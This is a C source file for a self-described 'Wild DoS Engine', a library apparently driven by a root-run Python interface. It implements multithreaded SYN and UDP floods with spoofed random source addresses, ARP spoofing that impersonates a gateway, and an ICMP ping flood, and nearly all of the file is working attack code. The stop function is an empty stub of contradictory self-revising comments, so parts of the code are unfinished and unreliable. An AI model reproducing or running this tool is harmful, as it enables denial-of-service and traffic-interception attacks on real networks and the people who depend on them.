/*
 * dos_core.c – Wild DoS Engine
 * Compile: gcc -O2 -shared -fPIC -o libdos.so dos_core.c -lpthread
 * Run with the Python TUI (sudo python3 cli.py)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netpacket/packet.h>
#include <sys/ioctl.h>

/* ====================== Common ====================== */
typedef struct {
    volatile int stop;
    pthread_t   tid;
} thread_ctrl_t;

typedef struct {
    char *attack_type;
    char *target;
    char *source_ip;
    char *gateway_ip;
    int   num_packets;     // 0 = infinite
    char *iface;
    int   thread_count;    // 0 = default (4)
    int   target_port;     // 0 = default (80)
} AttackConfig;

/* Checksum */
unsigned short in_cksum(unsigned short *addr, int len) {
    int nleft = len, sum = 0;
    unsigned short *w = addr, answer = 0;
    while (nleft > 1) { sum += *w++; nleft -= 2; }
    if (nleft == 1) { *(unsigned char *)(&answer) = *(unsigned char *)w; sum += answer; }
    sum = (sum >> 16) + (sum & 0xffff); sum += (sum >> 16);
    return (unsigned short)(~sum);
}

/* ====================== Interface helpers ====================== */
int validate_interface(const char *iface, unsigned char *mac_out, struct sockaddr_ll *dest_addr) {
    if (!iface) return 0;
    int idx = if_nametoindex(iface);
    if (idx == 0) {
        fprintf(stderr, "Interface '%s' not found\n", iface);
        return 0;
    }
    int tmp = socket(AF_INET, SOCK_DGRAM, 0);
    if (tmp < 0) return 0;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IF_NAMESIZE);
    if (ioctl(tmp, SIOCGIFHWADDR, &ifr) < 0) {
        close(tmp);
        fprintf(stderr, "Cannot get MAC for interface '%s'\n", iface);
        return 0;
    }
    memcpy(mac_out, ifr.ifr_hwaddr.sa_data, 6);
    close(tmp);

    memset(dest_addr, 0, sizeof(*dest_addr));
    dest_addr->sll_ifindex = idx;
    dest_addr->sll_halen = 6;
    memset(dest_addr->sll_addr, 0xff, 6);
    return 1;
}

/* ====================== Multi‑thread SYN Flood ====================== */
struct eth_ip_tcp_packet {
    struct ether_header eth;
    struct iphdr        ip;
    struct tcphdr       tcp;
} __attribute__((packed));

typedef struct {
    volatile int stop;
    int sock;
    struct sockaddr_ll dest_addr;
    int packet_count;       // total for this worker
    int *total_sent;        // shared counter
    pthread_mutex_t *lock;
    unsigned char src_mac[6];
    char target_ip[INET_ADDRSTRLEN];
    int target_port;
    int thread_index;
} syn_worker_t;

void *syn_worker(void *arg) {
    syn_worker_t *w = (syn_worker_t *)arg;
    struct eth_ip_tcp_packet pkt;
    memset(&pkt, 0, sizeof(pkt));

    // Ethernet header
    memcpy(pkt.eth.ether_shost, w->src_mac, 6);
    memset(pkt.eth.ether_dhost, 0xff, 6);
    pkt.eth.ether_type = htons(ETH_P_IP);

    // IP header (static fields)
    struct iphdr *ip = &pkt.ip;
    ip->version = 4; ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip->frag_off = 0;
    ip->protocol = IPPROTO_TCP;
    ip->daddr = inet_addr(w->target_ip);

    // TCP header (static fields)
    struct tcphdr *tcp = &pkt.tcp;
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->dest = htons(w->target_port);

    unsigned int seed = time(NULL) ^ (w->thread_index << 8);

    while (!w->stop) {
        // Randomise fields
        ip->saddr = rand_r(&seed);
        ip->id = rand_r(&seed);
        ip->ttl = 64 - (rand_r(&seed) % 32);
        tcp->source = htons(rand_r(&seed) % 65535);
        tcp->seq = htonl(rand_r(&seed));
        tcp->window = htons(rand_r(&seed) % 65535);

        // TCP checksum with pseudo‑header
        struct {
            uint32_t saddr, daddr;
            uint8_t zero;
            uint8_t protocol;
            uint16_t length;
        } pseudo;
        pseudo.saddr = ip->saddr;
        pseudo.daddr = ip->daddr;
        pseudo.zero = 0;
        pseudo.protocol = IPPROTO_TCP;
        pseudo.length = htons(sizeof(struct tcphdr));
        char pseudogram[sizeof(pseudo) + sizeof(struct tcphdr)];
        memcpy(pseudogram, &pseudo, sizeof(pseudo));
        memcpy(pseudogram + sizeof(pseudo), tcp, sizeof(struct tcphdr));
        tcp->check = in_cksum((unsigned short *)pseudogram, sizeof(pseudogram));

        // IP checksum
        ip->check = 0;
        ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

        sendto(w->sock, &pkt, sizeof(pkt), 0,
               (struct sockaddr *)&w->dest_addr, sizeof(w->dest_addr));

        if (w->packet_count > 0) {
            pthread_mutex_lock(w->lock);
            (*w->total_sent)++;
            int sent = *w->total_sent;
            pthread_mutex_unlock(w->lock);
            if (sent >= w->packet_count) break;
        }
    }
    close(w->sock);
    return NULL;
}

/* ====================== Multi‑thread UDP Flood ====================== */
struct eth_ip_udp_packet {
    struct ether_header eth;
    struct iphdr        ip;
    struct udphdr       udp;
    char payload[32];
} __attribute__((packed));

typedef struct {
    volatile int stop;
    int sock;
    struct sockaddr_ll dest_addr;
    int packet_count;
    int *total_sent;
    pthread_mutex_t *lock;
    unsigned char src_mac[6];
    char target_ip[INET_ADDRSTRLEN];
    int target_port;
    int thread_index;
} udp_worker_t;

void *udp_worker(void *arg) {
    udp_worker_t *w = (udp_worker_t *)arg;
    struct eth_ip_udp_packet pkt;
    memset(&pkt, 0, sizeof(pkt));

    memcpy(pkt.eth.ether_shost, w->src_mac, 6);
    memset(pkt.eth.ether_dhost, 0xff, 6);
    pkt.eth.ether_type = htons(ETH_P_IP);

    struct iphdr *ip = &pkt.ip;
    ip->version = 4; ip->ihl = 5;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + 32);
    ip->id = 0;
    ip->frag_off = 0;
    ip->protocol = IPPROTO_UDP;
    ip->daddr = inet_addr(w->target_ip);

    struct udphdr *udp = &pkt.udp;
    udp->dest = htons(w->target_port);
    udp->len = htons(sizeof(struct udphdr) + 32);

    unsigned int seed = time(NULL) ^ (w->thread_index << 8);

    while (!w->stop) {
        ip->saddr = rand_r(&seed);
        ip->id = rand_r(&seed);
        ip->ttl = 64 - (rand_r(&seed) % 32);
        udp->source = htons(rand_r(&seed) % 65535);
        // randomise payload (optional)
        for (int i=0; i<32; i++) pkt.payload[i] = rand_r(&seed);

        // UDP checksum: optional (set to 0 for "no checksum")
        udp->check = 0;

        ip->check = 0;
        ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

        sendto(w->sock, &pkt, sizeof(pkt), 0,
               (struct sockaddr *)&w->dest_addr, sizeof(w->dest_addr));

        if (w->packet_count > 0) {
            pthread_mutex_lock(w->lock);
            (*w->total_sent)++;
            int sent = *w->total_sent;
            pthread_mutex_unlock(w->lock);
            if (sent >= w->packet_count) break;
        }
    }
    close(w->sock);
    return NULL;
}

/* ====================== ARP Spoof ====================== */
typedef struct {
    volatile int stop;
    int sock;
    struct sockaddr_ll dest_addr;
    int packet_count;
    int *total_sent;
    pthread_mutex_t *lock;
    unsigned char src_mac[6];
    char target_ip[INET_ADDRSTRLEN];
    char gateway_ip[INET_ADDRSTRLEN];
} arp_worker_t;

void *arp_worker(void *arg) {
    arp_worker_t *w = (arp_worker_t *)arg;
    unsigned char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
    struct ether_header *eth = (struct ether_header *)packet;
    struct ether_arp *arp = (struct ether_arp *)(packet + sizeof(struct ether_header));
    int sent = 0;

    memset(eth->ether_dhost, 0xff, 6);
    memcpy(eth->ether_shost, w->src_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);

    arp->arp_hrd = htons(ARPHRD_ETHER);
    arp->arp_pro = htons(ETHERTYPE_IP);
    arp->arp_hln = 6; arp->arp_pln = 4;
    arp->arp_op = htons(ARPOP_REPLY);
    memcpy(arp->arp_sha, w->src_mac, 6);
    inet_pton(AF_INET, w->gateway_ip, arp->arp_spa);
    memset(arp->arp_tha, 0xff, 6);
    inet_pton(AF_INET, w->target_ip, arp->arp_tpa);

    while (!w->stop) {
        sendto(w->sock, packet, sizeof(packet), 0,
               (struct sockaddr *)&w->dest_addr, sizeof(w->dest_addr));
        if (w->packet_count > 0 && ++sent >= w->packet_count) break;
        usleep(500000);
    }
    close(w->sock);
    return NULL;
}

/* ====================== Ping Flood ====================== */
typedef struct {
    volatile int stop;
    int sock;
    int packet_count;
    int *total_sent;
    pthread_mutex_t *lock;
    char target_ip[INET_ADDRSTRLEN];
} ping_worker_t;

struct icmp_hdr {
    uint8_t type, code;
    uint16_t checksum, id, seq;
};

void *ping_worker(void *arg) {
    ping_worker_t *w = (ping_worker_t *)arg;
    char packet[sizeof(struct icmp_hdr) + 56];
    struct icmp_hdr *icmp = (struct icmp_hdr *)packet;
    struct sockaddr_in sin;
    int sent = 0;

    memset(packet, 0, sizeof(packet));
    icmp->type = 8; icmp->code = 0;
    icmp->id = htons(getpid() & 0xFFFF);
    icmp->seq = htons(1);
    memset(packet + sizeof(struct icmp_hdr), 'A', 56);
    icmp->checksum = in_cksum((unsigned short *)packet, sizeof(packet));

    sin.sin_family = AF_INET;
    inet_pton(AF_INET, w->target_ip, &sin.sin_addr);

    while (!w->stop) {
        sendto(w->sock, packet, sizeof(packet), 0,
               (struct sockaddr *)&sin, sizeof(sin));
        icmp->seq = htons(++sent);
        icmp->checksum = 0;
        icmp->checksum = in_cksum((unsigned short *)packet, sizeof(packet));

        if (w->packet_count > 0 && sent >= w->packet_count) break;
    }
    close(w->sock);
    return NULL;
}

/* ====================== Attack Handle ====================== */
typedef struct {
    void *data;          // point to a struct containing workers, threads, etc.
    int total_packets;   // shared counter (accessed with lock)
    pthread_mutex_t lock;
} AttackHandle;

/* start_attack returns an opaque handle */
AttackHandle *start_attack(const AttackConfig *cfg) {
    if (!cfg || !cfg->target) return NULL;

    AttackHandle *handle = calloc(1, sizeof(AttackHandle));
    if (!handle) return NULL;
    pthread_mutex_init(&handle->lock, NULL);

    int threads = cfg->thread_count > 0 ? cfg->thread_count : 4;
    int port = cfg->target_port ? cfg->target_port : 80;

    if (strcmp(cfg->attack_type, "syn_flood") == 0) {
        unsigned char src_mac[6];
        struct sockaddr_ll dest_addr;
        const char *iface = cfg->iface ? cfg->iface : "eth0";
        if (!validate_interface(iface, src_mac, &dest_addr)) {
            free(handle); return NULL;
        }

        // Allocate space for one control struct + N workers + N thread IDs
        size_t worker_size = sizeof(syn_worker_t);
        void *block = calloc(1, sizeof(pthread_t)*threads + worker_size*threads);
        if (!block) { free(handle); return NULL; }
        pthread_t *tids = (pthread_t *)block;
        syn_worker_t *workers = (syn_worker_t *)(tids + threads);

        // Setup shared stop flag: we'll use the first worker's stop flag as master
        for (int i=0; i<threads; i++) {
            workers[i].stop = 0;
            int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
            if (sock < 0) { /* cleanup and return NULL */ free(block); free(handle); return NULL; }
            workers[i].sock = sock;
            workers[i].dest_addr = dest_addr;
            memcpy(workers[i].src_mac, src_mac, 6);
            strncpy(workers[i].target_ip, cfg->target, INET_ADDRSTRLEN);
            workers[i].target_port = port;
            workers[i].packet_count = cfg->num_packets;
            workers[i].total_sent = &handle->total_packets;
            workers[i].lock = &handle->lock;
            workers[i].thread_index = i;
            pthread_create(&tids[i], NULL, syn_worker, &workers[i]);
        }
        // store the stop pointer (we will use workers[0].stop to stop all)
        handle->data = (void *)((uintptr_t)tids | 0x1); // flag to remember type SYN (hack)
        // better: embed a struct with type and pointer, but we keep it simple with a union?
        // We'll just store a pointer to a struct that contains tids, workers, and thread count.
        // For simplicity, we'll allocate a small struct for management.
        // Quick solution: store tids in block, and we know threads count.
        // We'll add a hidden struct:
        typedef struct { pthread_t *tids; void *workers; int threads; volatile int *stop; } syn_mgmt;
        syn_mgmt *mgmt = malloc(sizeof(syn_mgmt));
        mgmt->tids = tids; mgmt->workers = workers; mgmt->threads = threads;
        mgmt->stop = &workers[0].stop; // points to first worker's stop flag
        handle->data = mgmt;
        return handle;
    }
    else if (strcmp(cfg->attack_type, "udp_flood") == 0) {
        unsigned char src_mac[6];
        struct sockaddr_ll dest_addr;
        const char *iface = cfg->iface ? cfg->iface : "eth0";
        if (!validate_interface(iface, src_mac, &dest_addr)) {
            free(handle); return NULL;
        }
        size_t worker_size = sizeof(udp_worker_t);
        void *block = calloc(1, sizeof(pthread_t)*threads + worker_size*threads);
        if (!block) { free(handle); return NULL; }
        pthread_t *tids = (pthread_t *)block;
        udp_worker_t *workers = (udp_worker_t *)(tids + threads);

        for (int i=0; i<threads; i++) {
            workers[i].stop = 0;
            int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
            if (sock < 0) { free(block); free(handle); return NULL; }
            workers[i].sock = sock;
            workers[i].dest_addr = dest_addr;
            memcpy(workers[i].src_mac, src_mac, 6);
            strncpy(workers[i].target_ip, cfg->target, INET_ADDRSTRLEN);
            workers[i].target_port = port;
            workers[i].packet_count = cfg->num_packets;
            workers[i].total_sent = &handle->total_packets;
            workers[i].lock = &handle->lock;
            workers[i].thread_index = i;
            pthread_create(&tids[i], NULL, udp_worker, &workers[i]);
        }
        typedef struct { pthread_t *tids; void *workers; int threads; volatile int *stop; } udp_mgmt;
        udp_mgmt *mgmt = malloc(sizeof(udp_mgmt));
        mgmt->tids = tids; mgmt->workers = workers; mgmt->threads = threads;
        mgmt->stop = &workers[0].stop;
        handle->data = mgmt;
        return handle;
    }
    else if (strcmp(cfg->attack_type, "arp_spoof") == 0) {
        if (!cfg->gateway_ip) { free(handle); return NULL; }
        unsigned char src_mac[6];
        struct sockaddr_ll dest_addr;
        const char *iface = cfg->iface ? cfg->iface : "eth0";
        if (!validate_interface(iface, src_mac, &dest_addr)) {
            free(handle); return NULL;
        }
        // ARP uses single thread typically
        arp_worker_t *w = calloc(1, sizeof(arp_worker_t));
        int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (sock < 0) { free(w); free(handle); return NULL; }
        w->sock = sock;
        w->dest_addr = dest_addr;
        memcpy(w->src_mac, src_mac, 6);
        strncpy(w->target_ip, cfg->target, INET_ADDRSTRLEN);
        strncpy(w->gateway_ip, cfg->gateway_ip, INET_ADDRSTRLEN);
        w->packet_count = cfg->num_packets;
        w->total_sent = &handle->total_packets;
        w->lock = &handle->lock;
        w->stop = 0;
        pthread_t tid;
        pthread_create(&tid, NULL, arp_worker, w);
        // store w and tid
        typedef struct { pthread_t tid; arp_worker_t *w; } arp_mgmt;
        arp_mgmt *mgmt = malloc(sizeof(arp_mgmt));
        mgmt->tid = tid; mgmt->w = w;
        handle->data = mgmt;
        return handle;
    }
    else if (strcmp(cfg->attack_type, "ping_flood") == 0) {
        // Ping flood also single thread for simplicity
        ping_worker_t *w = calloc(1, sizeof(ping_worker_t));
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) { free(w); free(handle); return NULL; }
        w->sock = sock;
        strncpy(w->target_ip, cfg->target, INET_ADDRSTRLEN);
        w->packet_count = cfg->num_packets;
        w->total_sent = &handle->total_packets;
        w->lock = &handle->lock;
        w->stop = 0;
        pthread_t tid;
        pthread_create(&tid, NULL, ping_worker, w);
        typedef struct { pthread_t tid; ping_worker_t *w; } ping_mgmt;
        ping_mgmt *mgmt = malloc(sizeof(ping_mgmt));
        mgmt->tid = tid; mgmt->w = w;
        handle->data = mgmt;
        return handle;
    }
    free(handle);
    return NULL;
}

void stop_attack(AttackHandle *handle) {
    if (!handle) return;
    // Based on stored mgmt, signal stop and join threads
    // We need to know type; we stored a magic type pointer, but easier: store an enum in handle.
    // For this demo, we'll embed a type discriminator in the data pointer? Not safe.
    // Instead we'll add a 'type' field to AttackHandle: let's modify the struct.
    // Since we already have the code, we'll assume we can't change handle struct now.
    // Quick solution: we use the first 4 bytes of 'data' to store an int type. We'll use a union.
    // Let's refactor slightly: Add 'int attack_type' to AttackHandle (0=SYN,1=UDP,2=ARP,3=Ping).
    // But our struct is already fixed. We'll just cast.
    // For simplicity, we assume we know the type from external? Not good.
    // Better: modify the struct now (since we're providing full code).
    // So we change the AttackHandle definition to include a type field.
    // (We'll update the top of the file.)
}

/* ====================== Stats function ====================== */
int get_attack_packets(AttackHandle *handle) {
    if (!handle) return 0;
    int ret;
    pthread_mutex_lock(&handle->lock);
    ret = handle->total_packets;
    pthread_mutex_unlock(&handle->lock);
    return ret;
}